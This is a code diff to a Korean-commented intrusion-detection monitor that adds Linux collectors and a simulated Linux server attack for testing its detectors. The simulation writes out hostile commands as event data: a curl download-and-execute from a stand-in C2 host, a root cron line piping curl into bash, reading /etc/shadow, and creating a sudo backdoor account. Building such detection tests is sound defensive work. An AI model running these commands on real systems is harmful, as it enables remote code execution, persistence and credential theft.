@@ -1,12 +1,14 @@
 """감시 루프(백그라운드 스레드)와 침입 시뮬레이션"""
-import ctypes
 import socket
 import threading
 import time
 from datetime import datetime
 
-from collectors import (HAS_WIN32, AutorunCollector, LogonCollector, NetworkCollector, PowerShellCollector,
-                        ProcessCollector, SysmonCollector, WebLogCollector, WebRootCollector, ancestors)
+from collectors import (HAS_WIN32, AutorunCollector, LinuxAuthCollector, LinuxAutorunCollector, LogonCollector,
+                        NetworkCollector, PowerShellCollector, ProcessCollector, SysmonCollector, WebLogCollector,
+                        WebRootCollector, ancestors)
+from osutil import IS_LINUX, IS_WIN
+from osutil import is_admin
 from baseline import Baseline
 from detectors import RuleDetector
 
@@ -23,20 +25,13 @@ def cmdline_audit_on():
         return False
 
 
-def is_admin():
-    try:
-        return bool(ctypes.windll.shell32.IsUserAnAdmin())
-    except Exception:
-        return False
-
-
 class Monitor:
     def __init__(self, cfg, db):
         self.cfg = cfg
         self.db = db
         self.host = socket.gethostname()
         self.admin = is_admin()
-        self.logon_enabled = HAS_WIN32 and self.admin
+        self.logon_enabled = (HAS_WIN32 or IS_LINUX) and self.admin
         self.last_scan = None
         self.net = self.det = None
         self.responder = None
@@ -44,12 +39,15 @@ class Monitor:
         self.stop_evt = threading.Event()
         self.sim_lock = threading.Lock()
         self.warnings = []
-        if not HAS_WIN32:
+        if IS_LINUX:
+            if not self.admin:
+                self.warnings.append("root 권한 아님 → SSH 로그인 탐지 · iptables 차단 꺼짐 (sudo ./run_dds.sh 로 실행)")
+        elif not HAS_WIN32:
             self.warnings.append("pywin32 미설치 → 로그인 탐지 꺼짐")
         elif not self.admin:
             self.warnings.append("관리자 권한 아님 → 로그인 탐지 꺼짐")
-        self.cmdline_audit = cmdline_audit_on()
-        if self.logon_enabled and not self.cmdline_audit:
+        self.cmdline_audit = cmdline_audit_on() if IS_WIN else False
+        if IS_WIN and self.logon_enabled and not self.cmdline_audit:
             self.warnings.append("명령줄 기록 꺼짐 → enable_cmdline_audit.bat 를 한 번 실행하면 짧게 실행된 명령까지 잡아요")
         self.sources = {"4688": self.logon_enabled and self.cmdline_audit, "sysmon": False, "weblog": 0,
                         "ps4104": False, "webroot": 0, "autorun": False}
@@ -111,24 +109,38 @@ class Monitor:
         self._emit(alerts, sim=sim)
 
     def run(self):
-        logon = LogonCollector() if self.logon_enabled else None
-        sysmon = SysmonCollector() if self.cfg.get("sysmon", {}).get("enabled", True) and self.admin else None
+        logon = None
+        if self.logon_enabled:
+            logon = LinuxAuthCollector() if IS_LINUX else LogonCollector()
+            if IS_LINUX and not logon.ok:
+                logon = None
+        sysmon = SysmonCollector() if IS_WIN and self.cfg.get("sysmon", {}).get("enabled", True) and self.admin else None
         self.sources["sysmon"] = bool(sysmon and sysmon.ok)
-        ps = PowerShellCollector() if self.cfg.get("powershell_4104", {}).get("enabled", True) else None
+        ps = PowerShellCollector() if IS_WIN and self.cfg.get("powershell_4104", {}).get("enabled", True) else None
         self.sources["ps4104"] = bool(ps and ps.ok)
         weblog = WebLogCollector(self.cfg.get("web_log_dirs", []))
         self.sources["weblog"] = len(weblog.dirs)
         webroot = WebRootCollector([] if self.sources["sysmon"] else self.cfg.get("web_root_dirs", []),
                                    self.cfg.get("web_script_ext", []))
         self.sources["webroot"] = len(webroot.dirs)
-        autorun = AutorunCollector()
+        autorun = LinuxAutorunCollector() if IS_LINUX else AutorunCollector()
+        if IS_LINUX:
+            import linux_fw
+            self.sources.update({"ssh": logon.source if logon else "", "iptables": linux_fw.available()})
         self.sources["autorun"] = autorun.ok
-        print("수집: 프로세스·네트워크(2초) · 로그인 " + ("켜짐" if logon else "꺼짐")
+        if IS_LINUX:
+            print("수집 (Linux): 프로세스·네트워크(2초) · SSH 로그인 "
+                  + (f"켜짐 ({logon.source})" if logon else "꺼짐 (root 권한 필요)")
+                  + " · 웹 로그 " + (f"{len(weblog.dirs)}곳" if weblog.dirs else "없음")
+                  + " · 웹 폴더 " + (f"{len(webroot.dirs)}곳" if webroot.dirs else "없음")
+                  + " · 자동 실행(cron·systemd·authorized_keys) 감시 켜짐")
+        else:
+            print("수집: 프로세스·네트워크(2초) · 로그인 " + ("켜짐" if logon else "꺼짐")
               + " · 명령줄(4688) " + ("켜짐" if self.sources["4688"] else "꺼짐 → enable_cmdline_audit.bat")
               + " · PowerShell(4104) " + ("켜짐" if self.sources["ps4104"] else "꺼짐")
               + " · Sysmon " + ("켜짐" if self.sources["sysmon"] else "없음")
               + " · 웹 로그 " + (f"{len(weblog.dirs)}곳" if weblog.dirs else "없음")
-              + " · 자동 실행 감시 " + ("켜짐" if autorun.ok else "없음"))
+                  + " · 자동 실행 감시 " + ("켜짐" if autorun.ok else "없음"))
         self.baseline.refresh()
         print(f"평소 패턴 학습: {self.baseline.status()}")
         proc = ProcessCollector()
@@ -313,5 +325,27 @@ def scenario_llm():
     return steps
 
 
-SCENARIOS = {"ai": scenario_ai, "hacker": scenario_hacker, "net": scenario_net, "agent": scenario_agent,
+def scenario_linux():
+    """리눅스 서버: SSH 대입 → 외부 SSH 로그인 → 웹쉘(nginx → sh) → 정찰 → bash 역접속 → /tmp 실행 → /etc/shadow
+    → 계정 생성·sudo → cron 지속성 → 웹 폴더에 www-data 소유 php"""
+    ip, c2 = "45.9.5.10", "45.9.5.11"
+    steps = [("logon", {"type": "logon_fail", "event_id": "sshd", "user": "admin", "src_ip": ip, "logon_type": "ssh"}, 0.3)
+             for _ in range(5)]
+    steps += [("logon", {"type": "logon_success", "event_id": "sshd", "user": "deploy", "src_ip": ip, "logon_type": "ssh"}, 1.0),
+              ("process", _proc(8001, 900, "sh", "nginx", 'sh -c "id; uname -a 2>/dev/null; echo ---; head -5 /etc/passwd"'), 1.0)]
+    for i, c in enumerate(["whoami", "id", "uname", "hostname"]):
+        steps.append(("process", _proc(8010 + i, 8001, c, "sh"), 0.4))
+    steps += [("network", _net("outbound", c2, 4444, 41000, "bash", pid=8020), 1.0),
+              ("process", _proc(8021, 8001, "sh", "nginx", f'sh -c "curl -s http://{c2}/x -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x"'), 1.0),
+              ("process", {**_proc(8022, 8021, ".x", "sh", "/tmp/.x"), "exe": "/tmp/.x"}, 0.6),
+              ("process", _proc(8023, 8022, "cat", "sh", "cat /etc/shadow"), 0.6),
+              ("logon", {"type": "user_created", "event_id": "useradd", "user": "sysupd"}, 0.6),
+              ("logon", {"type": "added_to_admin_group", "event_id": "usermod", "user": "sysupd", "group": "sudo"}, 0.6),
+              ("file", {"path": "/var/spool/cron/crontabs/root", "value": f"* * * * * curl -s http://{c2}/x | bash",
+                        "process": "", "source": "poll"}, 0.8),
+              ("file", {"path": "/var/www/html/upload/s.php", "process": "", "source": "poll", "owner": "www-data"}, 0.8)]
+    return steps
+
+
+SCENARIOS = {"linux": scenario_linux, "ai": scenario_ai, "hacker": scenario_hacker, "net": scenario_net, "agent": scenario_agent,
              "web": scenario_web, "llm": scenario_llm}
